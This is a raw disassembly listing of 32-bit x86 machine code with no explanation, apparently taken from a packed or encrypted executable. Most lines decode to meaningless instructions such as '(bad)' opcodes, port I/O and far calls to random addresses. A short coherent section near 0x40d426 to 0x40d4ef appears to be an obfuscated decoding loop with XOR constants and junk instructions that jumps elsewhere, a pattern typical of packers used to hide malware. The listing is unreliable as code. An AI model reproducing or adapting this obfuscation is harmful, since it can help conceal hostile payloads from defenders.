  40cfc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cfc8:	shr    DWORD PTR [edi+ecx*4-0x59a06146],0x61
  40cfd0:	adc    BYTE PTR [ebx-0x39be85e7],0x68
  40cfd7:	fldcw  WORD PTR [ebp+0x6a1ce08b]
  40cfdd:	or     DWORD PTR [eax],edi
  40cfdf:	mov    ds:0x9a583fe6,al
  40cfe4:	into   
  40cfe5:	mov    eax,ds:0x9365be08
  40cfea:	jle    0x40d01e
  40cfec:	xchg   BYTE PTR [esi-0x49],al
  40cfef:	sbb    BYTE PTR [ebx+0x76],ch
  40cff2:	cmp    ah,BYTE PTR ds:0x5e6e325b
  40cff8:	push   ebx
  40cff9:	sub    bl,BYTE PTR [eax]
  40cffb:	(bad)  [edx+0x5673c385]
  40d001:	(bad)  
  40d002:	ffree  st(6)
  40d004:	add    BYTE PTR [eax],bl
  40d006:	fbstp  TBYTE PTR [ebx+0x65]
  40d009:	xchg   ebx,eax
  40d00a:	and    DWORD PTR [eax-0x18],esi
  40d00d:	add    ebp,edx
  40d00f:	into   
  40d010:	ret    0x2405
  40d013:	jbe    0x40d014
  40d015:	push   edx
  40d016:	pop    edi
  40d017:	xchg   esi,eax
  40d018:	ffreep st(6)
  40d01a:	cs inc ebx
  40d01c:	or     BYTE PTR [ebx+0x12502c10],cl
  40d022:	sub    dh,al
  40d024:	imul   esi,DWORD PTR [eax-0x10e62dde],0x27
  40d02b:	mov    ch,0x3e
  40d02d:	and    edx,DWORD PTR [edx]
  40d02f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d030:	mov    WORD PTR [ebx+0x567096dc],?
  40d036:	je     0x40d075
  40d038:	inc    edx
  40d039:	sub    al,0x12
  40d03b:	mov    bl,0x63
  40d03d:	dec    ebx
  40d03e:	sbb    ecx,DWORD PTR [edi-0x22799a5]
  40d044:	sub    al,BYTE PTR [eax-0x3660d856]
  40d04a:	mov    dl,0xd1
  40d04c:	inc    edx
  40d04d:	retf   
  40d04e:	jno    0x40cfe1
  40d050:	ja     0x40d02a
  40d052:	and    al,0x88
  40d054:	in     al,0xbc
  40d056:	xor    al,al
  40d058:	ret    
  40d059:	mov    eax,DWORD PTR [ebx+0x1c]
  40d05c:	es mov BYTE PTR ss:[ecx-0x4c37b8c6],cl
  40d064:	neg    DWORD PTR [esp+ebp*1]
  40d067:	cmp    al,0xa8
  40d069:	jae    0x40d096
  40d06b:	sar    DWORD PTR [ebp-0x7cca094],cl
  40d071:	sub    BYTE PTR ss:[edi+0x18],0xb2
  40d076:	sar    BYTE PTR [ecx+0x4],1
  40d079:	jbe    0x40d0be
  40d07b:	jb     0x40d057
  40d07d:	rcl    BYTE PTR [eax-0x6eea5327],0x4a
  40d084:	mov    esp,0x4c8e1efe
  40d089:	(bad)  
  40d08a:	stc    
  40d08b:	mov    ecx,0x67de58cc
  40d090:	xchg   esi,eax
  40d091:	test   al,0xff
  40d093:	push   ss
  40d094:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d095:	jmp    0x40d0c7
  40d097:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d098:	mov    dl,0x4b
  40d09a:	push   esp
  40d09b:	push   edi
  40d09c:	xor    al,0x2f
  40d09e:	xchg   ebx,eax
  40d09f:	aaa    
  40d0a0:	(bad)  
  40d0a1:	(bad)  
  40d0a2:	jle    0x40d0f5
  40d0a4:	sbb    eax,0x9403dc68
  40d0a9:	pop    ebp
  40d0aa:	test   eax,0x4eae77f9
  40d0af:	ins    BYTE PTR es:[edi],dx
  40d0b0:	and    dh,BYTE PTR [esi]
  40d0b2:	mov    al,ds:0x1da7b776
  40d0b7:	pop    edi
  40d0b8:	jg     0x40d108
  40d0ba:	out    0x4c,al
  40d0bc:	mov    BYTE PTR ds:0x7a33de65,ch
  40d0c2:	adc    al,0xe7
  40d0c4:	pushf  
  40d0c5:	outs   dx,BYTE PTR ds:[esi]
  40d0c6:	sahf   
  40d0c7:	jl     0x40d0c0
  40d0c9:	sbb    DWORD PTR [edi+0x4c407f81],esp
  40d0cf:	push   0xd
  40d0d1:	dec    edx
  40d0d2:	shl    BYTE PTR [ebx+0x38],cl
  40d0d5:	or     BYTE PTR [edi+0x6d844280],dl
  40d0db:	inc    edx
  40d0dc:	push   edx
  40d0dd:	dec    ecx
  40d0de:	test   BYTE PTR ds:[ecx],0x4
  40d0e2:	cmp    al,0xb8
  40d0e4:	pop    edi
  40d0e5:	int    0xa7
  40d0e7:	(bad)  
  40d0e8:	fadd   DWORD PTR [ebx-0x7c]
  40d0eb:	dec    esp
  40d0ec:	mov    ah,0x71
  40d0ee:	mov    ebp,0x534ae6b2
  40d0f3:	leave  
  40d0f4:	pop    edx
  40d0f5:	cmc    
  40d0f6:	ficomp DWORD PTR [esi+0x259effa3]
  40d0fc:	xor    BYTE PTR [ebx],al
  40d0fe:	fdivr  QWORD PTR [esi+edi*8+0xacd127b]
  40d105:	mov    edi,0xdbf94a88
  40d10a:	xor    eax,0x2832490e
  40d10f:	popa   
  40d110:	pop    ds
  40d111:	xchg   ecx,eax
  40d112:	fdiv   QWORD PTR [ecx+0x84ca99f]
  40d118:	cdq    
  40d119:	xor    al,0xef
  40d11b:	jmp    0x40d10e
  40d11d:	sbb    edx,DWORD PTR [edx+0x20d268e4]
  40d123:	fwait
  40d124:	ret    
  40d125:	(bad)  
  40d126:	jecxz  0x40d15e
  40d128:	pop    ss
  40d129:	fsqrt  
  40d12b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d12c:	cdq    
  40d12d:	imul   ebp,ebp,0x9ec3b9f5
  40d133:	jno    0x40d0fa
  40d135:	add    DWORD PTR [ecx-0x1e],0x8
  40d139:	add    DWORD PTR [edi-0x2376a6e8],edx
  40d13f:	adc    esp,DWORD PTR [ebp+0x75]
  40d142:	sbb    BYTE PTR [edx],ah
  40d144:	fild   WORD PTR [ebp-0x1a4cb593]
  40d14a:	mov    dl,0x0
  40d14c:	pushf  
  40d14d:	dec    edi
  40d14e:	imul   bp,bp,0x1452
  40d153:	adc    BYTE PTR [ebp+0x4a],dh
  40d156:	mov    esi,0x1ceb16d
  40d15b:	adc    ebx,DWORD PTR [edx]
  40d15d:	mov    edi,0x545f86a1
  40d162:	ins    BYTE PTR es:[edi],dx
  40d163:	xchg   DWORD PTR [edx-0x18],ecx
  40d166:	out    0xec,eax
  40d168:	pop    ss
  40d169:	adc    al,0x2
  40d16b:	or     eax,0xc79ca14e
  40d170:	iret   
  40d171:	out    0xda,al
  40d173:	(bad)  
  40d175:	sti    
  40d176:	push   0xfa19f8ac
  40d17b:	shr    bh,0x84
  40d17e:	dec    edx
  40d17f:	fiadd  WORD PTR [ebx]
  40d181:	ins    DWORD PTR es:[edi],dx
  40d182:	in     eax,0x48
  40d184:	dec    esi
  40d185:	pop    ds
  40d186:	inc    eax
  40d187:	inc    edi
  40d188:	sub    ah,BYTE PTR [edi]
  40d18a:	mov    ?,WORD PTR [ecx]
  40d18c:	ds ins BYTE PTR es:[edi],dx
  40d18e:	push   cs
  40d18f:	xchg   BYTE PTR [eax+0x7e],dl
  40d192:	sti    
  40d193:	sub    ch,BYTE PTR [eax-0x20f191e7]
  40d199:	push   cs
  40d19a:	jp     0x40d188
  40d19c:	lock jno 0x40d19b
  40d19f:	lea    edx,[edx+0x46]
  40d1a2:	clc    
  40d1a3:	loopne 0x40d1f0
  40d1a5:	(bad)  
  40d1a6:	mov    edx,0xc0bebd9f
  40d1ab:	iret   
  40d1ac:	ins    BYTE PTR es:[edi],dx
  40d1ad:	repnz int3 
  40d1af:	jp     0x40d142
  40d1b1:	or     ebx,DWORD PTR [esi+0x4e]
  40d1b4:	outs   dx,DWORD PTR ds:[esi]
  40d1b5:	or     dh,ch
  40d1b7:	cmp    eax,0x7a2421e7
  40d1bc:	fdivp  st(6),st
  40d1be:	and    ch,BYTE PTR [edx+edi*1+0x51a702fe]
  40d1c5:	lahf   
  40d1c6:	jl     0x40d1f7
  40d1c8:	pop    esi
  40d1c9:	push   esp
  40d1ca:	xchg   DWORD PTR [eax-0x4da86ed8],ebp
  40d1d0:	pop    ecx
  40d1d1:	sub    BYTE PTR [ebx-0x80],bh
  40d1d4:	pushf  
  40d1d5:	sub    eax,0x29414704
  40d1da:	jle    0x40d175
  40d1dc:	rol    DWORD PTR [edi+0x74],1
  40d1df:	ret    
  40d1e0:	fstp   DWORD PTR [edx+ebp*4-0x21]
  40d1e4:	and    esi,DWORD PTR [edi]
  40d1e6:	clc    
  40d1e7:	aaa    
  40d1e8:	mov    bl,0x80
  40d1ea:	out    0x67,al
  40d1ec:	lea    edx,[edx]
  40d1ee:	mov    al,ds:0xb537ae11
  40d1f3:	fld    TBYTE PTR [edi+eax*8]
  40d1f6:	stc    
  40d1f7:	ficomp WORD PTR [esi]
  40d1f9:	mov    ds:0x5315803c,eax
  40d1fe:	out    dx,eax
  40d1ff:	or     DWORD PTR [edi],edi
  40d201:	daa    
  40d202:	rcr    ah,0x7f
  40d205:	adc    DWORD PTR es:[edx+0x50],ebx
  40d209:	cmp    eax,0xc359ff08
  40d20e:	mov    dh,0xdd
  40d210:	arpl   WORD PTR [ebp+0x11],si
  40d213:	pop    esi
  40d214:	cli    
  40d215:	popa   
  40d216:	mov    dl,0x19
  40d218:	add    eax,0x1b9ad190
  40d21d:	dec    eax
  40d21e:	push   ss
  40d21f:	addr16 pop ecx
  40d221:	ror    DWORD PTR ds:0x52b88815,0xc9
  40d228:	lahf   
  40d229:	daa    
  40d22a:	ret    
  40d22b:	retf   
  40d22c:	dec    ebp
  40d22d:	cmp    al,0x58
  40d22f:	call   0xfb0e8563
  40d234:	jmp    0xfc7a:0xc0aef448
  40d23b:	xor    eax,0x1c258b8a
  40d240:	sti    
  40d241:	call   0x2109:0x8e369722
  40d248:	add    BYTE PTR [edi],bl
  40d24a:	scas   eax,DWORD PTR es:[edi]
  40d24b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d24c:	loope  0x40d1de
  40d24e:	lods   eax,DWORD PTR ds:[esi]
  40d24f:	jp     0x40d277
  40d251:	in     eax,0x1c
  40d253:	push   cs
  40d254:	mov    ds:0x14fe3ef0,al
  40d259:	arpl   si,bx
  40d25b:	mov    ebp,0xeee6f3f0
  40d260:	xchg   ebx,eax
  40d261:	icebp  
  40d262:	daa    
  40d263:	lock mov WORD PTR [ecx-0x30],cs
  40d267:	push   ss
  40d268:	add    edi,edx
  40d26a:	lahf   
  40d26b:	mov    ebx,0x6d63cf7d
  40d270:	test   BYTE PTR [eax],0x49
  40d273:	adc    DWORD PTR [esi-0x79],ecx
  40d276:	mov    edx,0x5a7e3d0b
  40d27b:	push   0x53
  40d27d:	or     DWORD PTR [edi],0x5172ac75
  40d283:	pop    es
  40d284:	add    bl,BYTE PTR [edx-0x70]
  40d287:	jp     0x40d29b
  40d289:	inc    eax
  40d28a:	out    dx,eax
  40d28b:	cdq    
  40d28c:	or     ah,BYTE PTR [ecx-0x3ead3dc]
  40d292:	ret    
  40d293:	test   eax,0xa3f7aa68
  40d298:	out    0x5a,eax
  40d29a:	cwde   
  40d29b:	test   DWORD PTR [edi],ebx
  40d29d:	shl    BYTE PTR [edi-0x26190a25],0x9b
  40d2a4:	jbe    0x40d2d9
  40d2a6:	sub    eax,0x5bcd5ec4
  40d2ab:	retf   0x9c46
  40d2ae:	mov    ds:0xb703564,eax
  40d2b3:	not    DWORD PTR [eax+0xa]
  40d2b6:	std    
  40d2b7:	or     ebx,0x2a70918c
  40d2bd:	add    esi,ebx
  40d2bf:	mov    al,0x48
  40d2c1:	adc    al,0xa3
  40d2c3:	rcl    BYTE PTR [eax+0x49],1
  40d2c6:	push   eax
  40d2c7:	jl     0x40d2f6
  40d2c9:	pop    ecx
  40d2ca:	fidiv  DWORD PTR [ebx]
  40d2cc:	xchg   esp,eax
  40d2cd:	dec    eax
  40d2ce:	mov    bh,0xf1
  40d2d0:	sub    ah,BYTE PTR [eax+0x60]
  40d2d3:	jecxz  0x40d2cf
  40d2d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2d6:	pusha  
  40d2d7:	sbb    al,0x38
  40d2d9:	dec    edx
  40d2da:	in     al,0xf
  40d2dc:	aam    0x22
  40d2de:	aad    0x73
  40d2e0:	pop    ecx
  40d2e1:	out    dx,al
  40d2e2:	adc    edx,DWORD PTR [ecx-0x46b0709f]
  40d2e8:	and    ebp,DWORD PTR ds:0xc96ec2b0
  40d2ee:	cmp    DWORD PTR [ecx+0x1d],edx
  40d2f1:	mov    ebx,0x57ab504e
  40d2f6:	xor    cl,ah
  40d2f8:	outs   dx,DWORD PTR ds:[esi]
  40d2f9:	and    BYTE PTR [edi],0xa5
  40d2fc:	ins    BYTE PTR es:[edi],dx
  40d2fd:	xor    al,0xda
  40d2ff:	ds pusha 
  40d301:	sbb    dh,BYTE PTR [eax]
  40d303:	or     esi,0x4ef7e2dd
  40d309:	aam    0x22
  40d30b:	add    esp,DWORD PTR [eax+0x49]
  40d30e:	dec    edi
  40d30f:	sub    DWORD PTR [eax-0x13],ebx
  40d312:	(bad)  
  40d314:	add    DWORD PTR [edi+0x37cbb29],eax
  40d31a:	cmp    DWORD PTR [esi+0xf],edi
  40d31d:	mov    cl,0x0
  40d31f:	loopne 0x40d2c0
  40d321:	dec    eax
  40d322:	test   DWORD PTR [edx+edi*1],esi
  40d325:	fidivr DWORD PTR [ebx-0x58]
  40d328:	mov    edi,?
  40d32a:	mov    ecx,0x194a4939
  40d32f:	call   0x3fd6bd2e
  40d334:	jo     0x40d2e2
  40d336:	lock xor al,BYTE PTR [edi+eiz*8+0x4462fd79]
  40d33e:	push   ecx
  40d33f:	adc    al,0xf4
  40d341:	rcr    DWORD PTR [edx+ebx*1+0x41],1
  40d345:	leave  
  40d346:	rol    DWORD PTR [eax+0x4b],1
  40d349:	repnz stos BYTE PTR es:[edi],al
  40d34b:	int3   
  40d34c:	fbld   TBYTE PTR [eax-0x16]
  40d34f:	test   al,0xd7
  40d351:	or     eax,0x39006898
  40d356:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d357:	fcom   DWORD PTR [ebx]
  40d359:	mov    ecx,ebx
  40d35b:	lahf   
  40d35c:	(bad)
  40d35f:	into   
  40d360:	fs fs js 0x40d32d
  40d364:	je     0x40d2fc
  40d366:	mov    ebp,0x1b3a07af
  40d36b:	ret    0xe46
  40d36e:	ror    esp,1
  40d370:	jb     0x40d361
  40d372:	enter  0xbbe6,0xaf
  40d376:	mov    cl,0xdc
  40d378:	jle    0x40d340
  40d37a:	ja     0x40d32b
  40d37c:	sbb    eax,0x36ac9b25
  40d381:	ret    
  40d382:	sbb    al,0x57
  40d384:	data16 arpl cx,si
  40d387:	data16 stos BYTE PTR es:[edi],al
  40d389:	push   esi
  40d38a:	sbb    ebx,DWORD PTR [esi-0x431b9cf]
  40d390:	jg     0x40d3b3
  40d392:	mov    eax,ds:0xaeec5c66
  40d397:	inc    ebx
  40d398:	push   ds
  40d399:	xchg   ebx,eax
  40d39a:	ficomp DWORD PTR [eax+0x5a]
  40d39d:	mov    esi,0x33a45b9d
  40d3a2:	xchg   BYTE PTR [esi],dl
  40d3a4:	sub    al,0x34
  40d3a6:	or     dl,BYTE PTR [esi+edi*2+0x61a7e91f]
  40d3ad:	inc    esp
  40d3ae:	dec    ecx
  40d3af:	mov    DWORD PTR ds:0x6217a00b,edi
  40d3b5:	out    0x3f,eax
  40d3b7:	mov    al,0x5d
  40d3b9:	iret   
  40d3ba:	fcompp 
  40d3bc:	sahf   
  40d3bd:	xchg   DWORD PTR [esi+edi*1],ecx
  40d3c0:	and    ch,BYTE PTR [edx+0x2c]
  40d3c3:	data16 jbe 0x40d41a
  40d3c6:	sub    dl,BYTE PTR [eax+0x44]
  40d3c9:	fbld   TBYTE PTR [ecx+0x59]
  40d3cc:	cmc    
  40d3cd:	popa   
  40d3ce:	pop    es
  40d3cf:	inc    edx
  40d3d0:	nop
  40d3d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3d2:	pop    esi
  40d3d3:	inc    ecx
  40d3d4:	div    DWORD PTR es:[edi-0x4b4845bd]
  40d3db:	cmp    eax,0xc733b3d8
  40d3e0:	jge    0x40d409
  40d3e2:	push   esi
  40d3e3:	call   0x6174:0x23e3d7c6
  40d3ea:	and    DWORD PTR [ebp+0x3f14adf6],eax
  40d3f0:	imul   edx,eax,0x13
  40d3f3:	jnp    0x40d409
  40d3f5:	popf   
  40d3f6:	adc    DWORD PTR [edx-0x79b9c9a8],eax
  40d3fc:	stos   DWORD PTR es:[edi],eax
  40d3fd:	jbe    0x40d449
  40d3ff:	pop    esp
  40d400:	cmc    
  40d401:	mov    ebx,0x83549797
  40d406:	jne    0x40d3c1
  40d408:	inc    eax
  40d409:	or     DWORD PTR [edx-0x44f04a34],edx
  40d40f:	mov    ah,0x52
  40d411:	ror    cl,cl
  40d413:	in     eax,0x32
  40d415:	clc    
  40d416:	cs test cl,bl
  40d419:	jg     0x40d39d
  40d41b:	dec    eax
  40d41c:	jecxz  0x40d484
  40d41e:	dec    esp
  40d41f:	mov    edx,0x75c06650
  40d424:	jl     0x40d426
  40d426:	mov    DWORD PTR [esi],ebx
  40d428:	lods   eax,DWORD PTR ds:[esi]
  40d429:	imul   eax,DWORD PTR [edx]
  40d42c:	mov    edx,DWORD PTR [ebp-0x4]
  40d42f:	xor    edx,ecx
  40d431:	mov    ecx,DWORD PTR [ebp+0x8]
  40d434:	lea    ecx,[edx+ecx*1+0x3272db]
  40d43b:	cmp    ecx,eax
  40d43d:	je     0x40d4b4
  40d443:	mov    edi,DWORD PTR [ebp-0x14]
  40d446:	mov    eax,DWORD PTR [ebp+0x8]
  40d449:	mov    edx,DWORD PTR [ebp+0x14]
  40d44c:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40d450:	mov    ecx,0x7510893
  40d455:	xor    edx,edx
  40d457:	xor    edi,ecx
  40d459:	mov    esi,0x3272db
  40d45e:	add    edi,esi
  40d460:	div    edi
  40d462:	mov    edx,DWORD PTR [ebp-0x4]
  40d465:	xor    edx,ecx
  40d467:	lea    eax,[edx+eax*1+0x3272db]
  40d46e:	mov    edx,DWORD PTR [ebp+0x8]
  40d471:	mov    edi,DWORD PTR [ebp-0x20]
  40d474:	mov    DWORD PTR [edi+edx*4],eax
  40d477:	mov    eax,DWORD PTR [ebp-0x14]
  40d47a:	mov    edx,DWORD PTR [ebp+0x8]
  40d47d:	xor    eax,ecx
  40d47f:	lea    eax,[eax+edx*1+0x3272db]
  40d486:	mov    DWORD PTR [ebp+0x8],eax
  40d489:	mov    eax,DWORD PTR [ebp-0x14]
  40d48c:	mov    edx,DWORD PTR [ebp+0x14]
  40d48f:	xor    eax,ecx
  40d491:	add    eax,esi
  40d493:	imul   eax,DWORD PTR [edx]
  40d496:	mov    edx,DWORD PTR [ebp-0x4]
  40d499:	xor    edx,ecx
  40d49b:	mov    ecx,DWORD PTR [ebp+0x8]
  40d49e:	lea    ecx,[edx+ecx*1+0x3272db]
  40d4a5:	cmp    ecx,eax
  40d4a7:	jne    0x40d443
  40d4ad:	mov    eax,esi
  40d4af:	jmp    0x40d4b9
  40d4b4:	mov    eax,0x3272db
  40d4b9:	mov    ebx,0x7510893
  40d4be:	mov    ecx,DWORD PTR [ebp-0x4]
  40d4c1:	xor    ecx,ebx
  40d4c3:	add    ecx,eax
  40d4c5:	mov    DWORD PTR [ebp-0xc],ecx
  40d4c8:	mov    ebx,0x65655
  40d4cd:	add    ebx,0x3234
  40d4d3:	xchg   ebx,esi
  40d4d5:	xor    ebx,ebx
  40d4d7:	push   esi
  40d4d8:	mov    esi,ebx
  40d4da:	pop    ebx
  40d4db:	mov    edx,esi
  40d4dd:	add    ebx,0x1002
  40d4e3:	lea    eax,[ebp-0x10]
  40d4e6:	add    edx,eax
  40d4e8:	add    edx,0x5
  40d4eb:	push   edx
  40d4ec:	inc    esi
  40d4ed:	pop    ecx
  40d4ee:	dec    ecx
  40d4ef:	jmp    0x40f854
  40d4f4:	jl     0x40d532
  40d4f6:	pop    es
  40d4f7:	call   0xe49cb803
  40d4fc:	and    BYTE PTR [edi-0x45e8b123],0xa0
  40d503:	mov    ds:0x6262d2a0,eax
  40d508:	cmp    bl,BYTE PTR [edi+0x62]
  40d50b:	(bad)  
  40d50c:	std    
  40d50d:	jecxz  0x40d4bc
  40d50f:	jo     0x40d4ee
  40d511:	repnz add ch,BYTE PTR [ecx+0x509fe391]
  40d518:	mov    bh,0x98
  40d51a:	stos   DWORD PTR es:[edi],eax
  40d51b:	in     al,dx
  40d51c:	test   BYTE PTR [edi+ecx*8-0x16],ch
  40d520:	popf   
  40d521:	mov    ebp,0x38b27d29
  40d526:	ja     0x40d4d3
  40d528:	out    dx,al
  40d529:	jne    0x40d55c
  40d52b:	outs   dx,DWORD PTR ds:[esi]
  40d52c:	aam    0xeb
  40d52e:	cld    
  40d52f:	fistp  WORD PTR [ebx+ecx*1]
  40d532:	mov    bh,0x4
  40d534:	mov    DWORD PTR [ebx+ebx*1-0x509fc929],ecx
  40d53b:	repnz adc BYTE PTR [eax+0x7a],0x19
  40d540:	retf   0x92a4
  40d543:	jmp    0x40d595
  40d545:	xchg   esp,eax
  40d546:	inc    eax
  40d547:	xchg   BYTE PTR [ebx-0x2e9793df],dl
  40d54d:	xor    edx,eax
  40d54f:	int3   
  40d550:	outs   dx,BYTE PTR ds:[esi]
  40d551:	pop    es
  40d552:	xchg   esp,eax
  40d553:	repz jmp 0x813a:0xf9db87d0
  40d55b:	xchg   DWORD PTR [esi-0x32],edx
  40d55e:	adc    eax,0x32dc0010
  40d563:	pop    ecx
  40d564:	div    BYTE PTR ds:0x19e7b889
  40d56a:	les    eax,FWORD PTR [eax-0x54d2e1ca]
  40d570:	cmp    edi,DWORD PTR [ebp+0x48]
  40d573:	out    dx,al
  40d574:	(bad)  
  40d575:	dec    ebx
  40d576:	ficomp DWORD PTR [edx+0x11]
  40d579:	outs   dx,DWORD PTR ds:[esi]
  40d57a:	fcom   QWORD PTR [ebx-0x4bae4e2a]
  40d580:	or     eax,0xa74ea75f
  40d585:	ret    0xa2da
  40d588:	add    bh,al
  40d58a:	mov    DWORD PTR [esi],0x56eabdd
  40d590:	push   ds
  40d591:	aas    
  40d592:	push   0xffffffbb
  40d594:	jmp    0x40d550
  40d596:	adc    dh,BYTE PTR [ecx]
  40d598:	(bad)  
  40d599:	sub    eax,0x9d627f6e
  40d59e:	mov    cl,0x8d
  40d5a0:	jne    0x40d5a1
  40d5a2:	adc    BYTE PTR [eax],al
  40d5a4:	out    0xbd,al
  40d5a6:	mul    DWORD PTR [ebx-0x3]
  40d5a9:	pop    eax
  40d5aa:	lods   eax,DWORD PTR ds:[esi]
  40d5ab:	push   esi
  40d5ac:	cdq    
  40d5ad:	pop    ebx
  40d5ae:	xchg   edx,eax
  40d5af:	pop    edx
  40d5b0:	pop    eax
  40d5b1:	dec    ebp
  40d5b2:	jbe    0x40d579
  40d5b4:	xchg   ebx,eax
  40d5b5:	cwde   
  40d5b6:	imul   ebx,edx,0x16
  40d5b9:	jl     0x40d5c0
  40d5bb:	out    dx,al
  40d5bc:	mov    ecx,0x12174edb
  40d5c1:	popa   
  40d5c2:	iret   
  40d5c3:	les    esp,FWORD PTR [esi-0x55350d43]
  40d5c9:	jae    0x40d59a
  40d5cb:	adc    ebp,DWORD PTR [ebp+esi*2-0x235a13b3]
  40d5d2:	in     al,dx
  40d5d3:	mov    bl,0x74
  40d5d5:	ret    0xe361
  40d5d8:	mov    esi,0x592b407a
  40d5dd:	jnp    0x40d5e9
  40d5df:	das    
  40d5e0:	or     eax,0x1bba4e34
  40d5e5:	imul   ebp,DWORD PTR [ebx+0x7c77f444],0x4978c7bd
  40d5ef:	scas   eax,DWORD PTR es:[edi]
  40d5f0:	(bad)  
  40d5f1:	into   
  40d5f2:	mov    edx,0x9e3dbe82
  40d5f7:	sub    BYTE PTR [edi-0x21b7c476],cl
  40d5fd:	push   ss
  40d5fe:	ror    BYTE PTR [eax-0x7180b392],cl
  40d604:	int    0x3a
  40d606:	and    ecx,ebp
  40d608:	and    BYTE PTR [ecx],0x6f
  40d60b:	lock xor bh,BYTE PTR [ecx]
  40d60e:	test   eax,0x8e96cc7a
  40d613:	test   bl,al
  40d615:	fisubr DWORD PTR ds:0x5c0713b5
  40d61b:	add    BYTE PTR [edx],0x36
  40d61e:	sub    DWORD PTR [edx],0xcf239966
  40d624:	adc    DWORD PTR [ebx+0x6ec30671],ecx
  40d62a:	sub    al,0x6e
  40d62c:	mov    ch,0x32
  40d62e:	adc    BYTE PTR ds:0xb429d2be,cl
  40d634:	and    DWORD PTR [ecx+0x4bf4b169],edx
  40d63a:	inc    ebp
  40d63b:	popf   
  40d63c:	test   bl,bl
  40d63e:	out    0xb3,eax
  40d640:	adc    BYTE PTR ds:0x17ab10aa,dh
  40d646:	out    dx,eax
  40d647:	arpl   WORD PTR [ebx-0x5a6bfce7],dx
  40d64d:	repz pop es
  40d64f:	(bad)  
  40d650:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d651:	rcr    BYTE PTR [edx-0x5d],0xa4
  40d655:	jne    0x40d5f6
  40d657:	aam    0x46
  40d659:	out    0x3a,al
  40d65b:	aaa    
  40d65c:	xor    bl,BYTE PTR [ebx-0x8]
  40d65f:	mov    dl,BYTE PTR [edi-0x41d7872e]
  40d665:	xor    dl,BYTE PTR [edx-0x55]
  40d668:	and    BYTE PTR [esi-0x50c885dd],0x67
  40d66f:	or     eax,0xa47f9f25
  40d674:	jmp    0x8e3de7c0
  40d679:	sbb    al,0x83
  40d67b:	dec    esi
  40d67c:	fldl2t 
  40d67e:	repz scas eax,DWORD PTR es:[edi]
  40d680:	nop
  40d681:	or     al,0x93
  40d683:	stos   BYTE PTR es:[edi],al
  40d684:	or     edi,DWORD PTR [edx]
  40d686:	(bad)  
  40d687:	clc    
  40d688:	cmp    al,0x70
  40d68a:	add    BYTE PTR [edx-0x6905b546],bh
  40d690:	cld    
  40d691:	jne    0x40d622
  40d693:	mov    ebp,DWORD PTR [ebp-0x10]
  40d696:	add    al,0xe6
  40d698:	add    DWORD PTR [eax-0x6cab7869],ebx
  40d69e:	int    0x18
  40d6a0:	mov    BYTE PTR [ebx],bl
  40d6a2:	lds    eax,FWORD PTR [eax+0x36]
  40d6a5:	jb     0x40d6e2
  40d6a7:	rol    DWORD PTR [edx],cl
  40d6a9:	sbb    al,0xe2
  40d6ab:	cmovg  edx,DWORD PTR [ebx+0x56]
  40d6af:	hlt    
  40d6b0:	(bad)  
  40d6b1:	push   0x8859d3d3
  40d6b6:	cmp    edx,ecx
  40d6b8:	xor    DWORD PTR [edi-0x22],esp
  40d6bb:	adc    DWORD PTR [edx-0x27],edx
  40d6be:	test   DWORD PTR [ecx-0xe],0x2316b247
  40d6c5:	inc    esi
  40d6c6:	jb     0x40d662
  40d6c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6c9:	sbb    edx,DWORD PTR [eax+eax*8-0x7a2c2606]
  40d6d0:	sub    al,0x99
  40d6d2:	mov    ds:0x1cf5b855,eax
  40d6d7:	outs   dx,DWORD PTR ds:[esi]
  40d6d8:	xchg   edx,eax
  40d6d9:	adc    esp,DWORD PTR [eax+eax*8+0x5b]
  40d6dd:	and    esp,DWORD PTR [ebx-0x5e]
  40d6e0:	sbb    eax,0x645acc1a
  40d6e5:	mov    ecx,0x308ad482
  40d6ea:	lods   eax,DWORD PTR ds:[esi]
  40d6eb:	sbb    cl,BYTE PTR [edi-0x4e252218]
  40d6f1:	cli    
  40d6f2:	int3   
  40d6f3:	jle    0x40d67f
  40d6f5:	cs pop ebx
  40d6f7:	nop
  40d6f8:	hlt    
  40d6f9:	xor    DWORD PTR [ebp+edi*4+0x6c9dcf3a],ebx
  40d700:	pop    es
  40d701:	mov    BYTE PTR [esi],0xe1
  40d704:	adc    DWORD PTR [edx+0x56],esi
  40d707:	sub    al,0x2d
  40d709:	ss cli 
  40d70b:	jns    0x40d6dd
  40d70d:	and    al,0x23
  40d70f:	sub    BYTE PTR [esi-0x40],ch
  40d712:	das    
  40d713:	bound  esi,QWORD PTR [ebp+edi*1-0x46]
  40d717:	mov    ah,BYTE PTR [ebp-0x270bd918]
  40d71d:	ss enter 0x17c9,0x43
  40d722:	push   esp
  40d723:	pop    ecx
  40d724:	es xchg esi,eax
  40d726:	push   ds
  40d727:	scas   eax,DWORD PTR es:[edi]
  40d728:	cmc    
  40d729:	addr16 leave 
  40d72b:	inc    edx
  40d72c:	xor    ebp,ebp
  40d72e:	into   
  40d72f:	(bad)  
  40d730:	add    BYTE PTR [esi+0x4414a641],dh
  40d736:	retf   0xcba1
  40d739:	imul   ebx,ebp,0xffffffef
  40d73c:	push   cs
  40d73d:	daa    
  40d73e:	and    edi,DWORD PTR [edi+0x33]
  40d741:	fcom   st(0)
  40d743:	sub    eax,0x7ccae91a
  40d748:	hlt    
  40d749:	mov    esp,0x385d7de6
  40d74e:	xor    esp,DWORD PTR [ebp+edx*4-0x4d]
  40d752:	push   es
  40d753:	push   es
  40d754:	fild   DWORD PTR [eax]
  40d756:	xchg   ecx,eax
  40d757:	mov    ebp,0x9c0d201e
  40d75c:	ja     0x40d6e1
  40d75e:	call   ebx
  40d760:	loope  0x40d722
  40d762:	call   0xdaba:0x882cf2e4
  40d769:	es scas al,BYTE PTR es:[edi]
  40d76b:	aam    0x75
  40d76d:	cs mov al,0xcc
  40d770:	mov    ebp,DWORD PTR [edi-0x2bd2694e]
  40d776:	adc    BYTE PTR [edi-0x2c],bh
